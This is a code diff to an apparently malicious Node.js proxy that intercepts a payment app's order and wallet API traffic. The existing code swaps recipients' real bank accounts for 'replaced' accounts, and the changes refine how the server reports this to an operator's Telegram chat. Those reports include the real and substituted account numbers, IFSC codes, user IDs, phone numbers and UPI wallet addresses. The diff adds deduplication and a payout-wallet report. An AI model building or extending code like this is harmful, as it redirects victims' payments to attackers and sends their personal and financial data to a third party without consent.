@@ -328,6 +328,7 @@ const tokenUserMap = {};
 const userPhoneMap = {};
 const refreshTokenMap = {};
 const userDeviceMap = {};
+const orderNotifyCache = new Map();
 let debugMode = false;
 
 function isAuthFailureResponse(jsonResp) {
@@ -2060,43 +2061,51 @@ app.all('/app/payment/order/orderInfo', async (req, res) => {
       if (data.adminChatId && bot && !isLogOff(data, userId) && !(await isLogOffByToken(data, req))) {
         const phone = getPhone(data, userId);
         const orderId = dd.orderId || dd.orderNo || dd.buyId || req.query?.buyId || req.query?.orderId || 'N/A';
-        let bankSection = '';
-        if (replaced && bank) {
-          if (realAcct && realName) {
-            bankSection =
-              `🏦 Real Bank:\n` +
-              `   Acc: ${realAcct}\n` +
-              `   Name: ${realName}\n` +
-              `${realIfsc ? '   IFSC: ' + realIfsc + '\n' : ''}` +
-              `━━━━━━━━━━━━━━━━━━\n` +
-              `🔄 Replaced With:\n` +
-              `   Acc: ${bank.accountNo}\n` +
-              `   Name: ${bank.accountHolder}\n` +
-              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
-          } else {
-            bankSection =
-              `🔄 Replaced Bank:\n` +
-              `   Acc: ${bank.accountNo}\n` +
-              `   Name: ${bank.accountHolder}\n` +
-              `   IFSC: ${bank.ifsc}${bank.bankName ? ' | ' + bank.bankName : ''}`;
+        
+        // Deduplication check
+        const cacheKey = `${userId}_${orderId}_${orderAmt}`;
+        const lastNotify = orderNotifyCache.get(cacheKey);
+        const now = Date.now();
+        
+        if (!lastNotify || (now - lastNotify > 30000)) { // 30 seconds cooldown for same order
+          orderNotifyCache.set(cacheKey, now);
+          // Cleanup old cache entries (older than 5 mins)
+          if (orderNotifyCache.size > 1000) {
+            for (const [k, v] of orderNotifyCache.entries()) {
+              if (now - v > 300000) orderNotifyCache.delete(k);
+            }
           }
-        } else if (notReplacedReason) {
-          bankSection = `⚠️ Bank NOT Replaced\n   Reason: ${notReplacedReason}`;
-        } else {
-          bankSection = `⚠️ No active bank set`;
+
+          let bankSection = '';
+          if (replaced && bank) {
+            bankSection =
+              `🏦 *Real Bank Details:*\n` +
+              `   Acc: \`${realAcct || 'N/A'}\`\n` +
+              `   Name: \`${realName || 'N/A'}\`\n` +
+              `   IFSC: \`${realIfsc || 'N/A'}\`\n` +
+              `━━━━━━━━━━━━━━━━━━\n` +
+              `🔄 *Replaced With:*\n` +
+              `   Acc: \`${bank.accountNo}\`\n` +
+              `   Name: \`${bank.accountHolder}\`\n` +
+              `   IFSC: \`${bank.ifsc}\`${bank.bankName ? ' | ' + bank.bankName : ''}`;
+          } else if (notReplacedReason) {
+            bankSection = `⚠️ *Bank NOT Replaced*\n   Reason: ${notReplacedReason}`;
+          } else {
+            bankSection = `⚠️ *No active bank set*`;
+          }
+
+          const msg =
+            `📋 *Order Details Loaded*\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n` +
+            `📋 *Order ID:* \`${orderId}\`\n` +
+            `💰 *Amount:* \`₹${orderAmt || 'N/A'}\`\n` +
+            `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            bankSection;
+
+          bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
         }
-
-        const msg =
-          `📋 Order Details Loaded\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          `👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n` +
-          `📋 Order ID: ${orderId}\n` +
-          `💰 Amount: ₹${orderAmt || 'N/A'}\n` +
-          `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n` +
-          `━━━━━━━━━━━━━━━━━━\n` +
-          bankSection;
-
-        bot.sendMessage(data.adminChatId, msg).catch(()=>{});
       }
     }
 
@@ -2171,18 +2180,30 @@ for (const ep of COLLECTION_ENDPOINTS) {
           if (path === '/app/ct/app/collection/getWalletList' && jsonResp && jsonResp.code === 1000 && Array.isArray(jsonResp.data)) {
             let msg = `💳 *Link UPI Report*\n\n`;
             msg += `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
-            
             jsonResp.data.forEach((item, index) => {
               const status = item.status === 1 ? '✅ Enabled' : '❌ Failed';
               const walletName = item.wallet ? item.wallet.name : 'Unknown App';
               const address = item.address || 'No UPI ID';
               const range = item.acceptableRange ? `₹${item.acceptableRange[0]} ~ ₹${item.acceptableRange[1]}` : 'N/A';
-              
               msg += `${index + 1}. *${walletName}* [${status}]\n`;
               msg += `   📍 ID: \`${address}\`\n`;
               msg += `   💰 Range: \`${range}\`\n\n`;
             });
-            
+            bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
+          } else if (path === '/app/ct/app/collection/getPayoutWalletList' && jsonResp && jsonResp.code === 1000 && Array.isArray(jsonResp.data)) {
+            let msg = `📲 *Payout Wallet Selection*\n\n`;
+            msg += `👤 *User:* \`${userId || 'N/A'}\`${phone ? ' (' + phone + ')' : ''}\n\n`;
+            const selected = jsonResp.data.filter(i => i.status === 1);
+            if (selected.length > 0) {
+              selected.forEach((item, index) => {
+                const walletName = item.wallet ? item.wallet.name : 'Unknown App';
+                const address = item.address || 'N/A';
+                msg += `${index + 1}. ✅ *${walletName}* Selected\n`;
+                msg += `   📍 ID: \`${address}\`\n\n`;
+              });
+            } else {
+              msg += `⚠️ No active payout wallet found.\n`;
+            }
             bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(()=>{});
           } else {
             bot.sendMessage(data.adminChatId, `📡 ${path}\n👤 User: ${userId || 'N/A'}${phone ? ' (' + phone + ')' : ''}\n✅ Status: Success`).catch(()=>{});
